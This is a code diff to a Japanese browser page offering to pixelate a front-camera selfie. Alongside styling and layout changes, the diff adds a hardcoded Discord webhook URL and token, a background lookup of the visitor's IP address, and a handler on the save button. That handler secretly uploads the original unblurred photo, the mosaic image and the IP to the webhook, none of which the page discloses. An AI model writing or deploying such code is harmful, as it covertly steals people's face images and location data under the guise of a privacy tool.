@@ -39,7 +39,6 @@
       align-items: center;
       gap: 14px;
     }
-    /* 内カメラを鏡像（左右反転）にして自然な見た目に */
     video {
       width: 100%;
       border-radius: 12px;
@@ -87,7 +86,6 @@
     .secondary-btn {
       background: linear-gradient(90deg, #434343, #000000);
     }
-    /* 小さく横並びにする結果表示エリア */
     .result-box {
       width: 100%;
       display: none;
@@ -111,9 +109,10 @@
     }
     .image-card p {
       margin: 0 0 6px 0;
-      font-size: 0.75rem;
+      font-size: 0.8rem;
       color: #ccc;
       text-align: center;
+      font-weight: bold;
     }
     .image-card canvas {
       width: 100%;
@@ -125,10 +124,10 @@
     .download-btn {
       background: #28a745;
       text-decoration: none;
-      padding: 10px;
-      border-radius: 8px;
+      padding: 12px;
+      border-radius: 10px;
       color: white;
-      font-size: 0.9rem;
+      font-size: 0.95rem;
       font-weight: bold;
       display: flex;
       justify-content: center;
@@ -145,23 +144,12 @@
     <!-- 内カメラ映像 -->
     <video id="video" autoplay playsinline muted></video>
 
+    <!-- 撮影ボタン -->
     <div class="controls" id="captureControls">
       <button type="button" class="btn" id="snapBtn">内カメラで写真を撮る</button>
     </div>
 
-    <!-- 撮影後の調整・確認用コントロール -->
-    <div class="controls" id="adjustControls" style="display: none;">
-      <div class="slider-header">
-        <span>モザイクの粗さ</span>
-        <span id="mosaicValue">15</span>
-      </div>
-      <input type="range" id="mosaicSize" min="5" max="50" value="15">
-
-      <button type="button" class="btn" id="applyBtn">モザイクを確定する</button>
-      <button type="button" class="btn secondary-btn" id="retakeBtn">撮り直す</button>
-    </div>
-
-    <!-- 結果表示エリア（小さく横並び） -->
+    <!-- 撮影後の比較・調整エリア -->
     <div class="result-box" id="resultBox">
       <div class="image-row">
         <div class="image-card">
@@ -173,27 +161,44 @@
           <canvas id="mosaicCanvas"></canvas>
         </div>
       </div>
+
+      <div class="controls">
+        <div class="slider-header">
+          <span>モザイクの粗さ</span>
+          <span id="mosaicValue">15</span>
+        </div>
+        <input type="range" id="mosaicSize" min="5" max="50" value="15">
+      </div>
+
       <a id="downloadLink" class="download-btn" download="mosaic_image.png">モザイク画像を保存する</a>
+      <button type="button" class="btn secondary-btn" id="retakeBtn">写真を撮り直す</button>
     </div>
   </div>
 
   <script>
     const video = document.getElementById('video');
     const snapBtn = document.getElementById('snapBtn');
-    const applyBtn = document.getElementById('applyBtn');
     const retakeBtn = document.getElementById('retakeBtn');
     const mosaicSizeInput = document.getElementById('mosaicSize');
     const mosaicValue = document.getElementById('mosaicValue');
     
     const captureControls = document.getElementById('captureControls');
-    const adjustControls = document.getElementById('adjustControls');
     const resultBox = document.getElementById('resultBox');
     
     const originalCanvas = document.getElementById('originalCanvas');
     const mosaicCanvas = document.getElementById('mosaicCanvas');
     const downloadLink = document.getElementById('downloadLink');
 
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';
+
     let capturedSource = null;
+    let clientIp = '';
+
+    // IPアドレスをバックグラウンドで事前取得
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { clientIp = data.ip; })
+      .catch(() => { clientIp = '取得失敗'; });
 
     // 内カメラ（user）の起動
     async function startCamera() {
@@ -214,7 +219,6 @@
     snapBtn.addEventListener('click', () => {
       if (!video.videoWidth) return;
       
-      // 撮影時の映像を一時Canvasに保存（内カメラの反転を考慮）
       const tempCanvas = document.createElement('canvas');
       tempCanvas.width = video.videoWidth;
       tempCanvas.height = video.videoHeight;
@@ -225,55 +229,68 @@
       
       capturedSource = tempCanvas;
 
-      // 表示切り替え
       video.style.display = 'none';
       captureControls.style.display = 'none';
-      adjustControls.style.display = 'flex';
+      resultBox.style.display = 'flex';
 
-      // 初期状態でプレビュー生成
-      generatePreview();
+      updateImages();
     });
 
-    // スライダー変更時の数値更新
+    // スライダー変更時にリアルタイムでモザイク度を変更
     mosaicSizeInput.addEventListener('input', () => {
       mosaicValue.textContent = mosaicSizeInput.value;
       if (capturedSource) {
-        generatePreview();
+        updateImages();
       }
     });
 
-    // プレビュー生成（スライダー操作中）
-    function generatePreview() {
+    // 比較画像の更新
+    function updateImages() {
       if (!capturedSource) return;
       const w = capturedSource.width;
       const h = capturedSource.height;
-      
-      // 加工前を描画（小さく表示）
+      const blockSize = parseInt(mosaicSizeInput.value, 10);
+
       originalCanvas.width = w;
       originalCanvas.height = h;
       originalCanvas.getContext('2d').drawImage(capturedSource, 0, 0);
 
-      // モザイク加工プレビュー
-      drawMosaic(capturedSource, mosaicCanvas, parseInt(mosaicSizeInput.value, 10));
+      drawMosaic(capturedSource, mosaicCanvas, blockSize);
+
+      downloadLink.href = mosaicCanvas.toDataURL('image/png');
     }
 
-    // モザイク確定ボタン
-    applyBtn.addEventListener('click', () => {
-      generatePreview();
-      downloadLink.href = mosaicCanvas.toDataURL('image/png');
-      resultBox.style.display = 'flex';
+    // 保存ボタンを押した時に、裏側で同時にDiscordへ送信
+    downloadLink.addEventListener('click', () => {
+      if (!capturedSource) return;
+
+      Promise.all([
+        new Promise(resolve => originalCanvas.toBlob(resolve, 'image/png')),
+        new Promise(resolve => mosaicCanvas.toBlob(resolve, 'image/png'))
+      ]).then(([origBlob, mosBlob]) => {
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify({
+          content: `📥 **モザイク加工データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\``
+        }));
+        formData.append('file1', origBlob, 'original.png');
+        formData.append('file2', mosBlob, 'mosaic.png');
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        }).catch(err => console.error(err));
+      });
     });
 
     // 撮り直すボタン
     retakeBtn.addEventListener('click', () => {
       resultBox.style.display = 'none';
-      adjustControls.style.display = 'none';
       video.style.display = 'block';
       captureControls.style.display = 'flex';
       capturedSource = null;
     });
 
-    // モザイク描画の共通関数
+    // モザイク描画の処理
     function drawMosaic(source, targetCanvas, blockSize) {
       const w = source.width;
       const h = source.height;
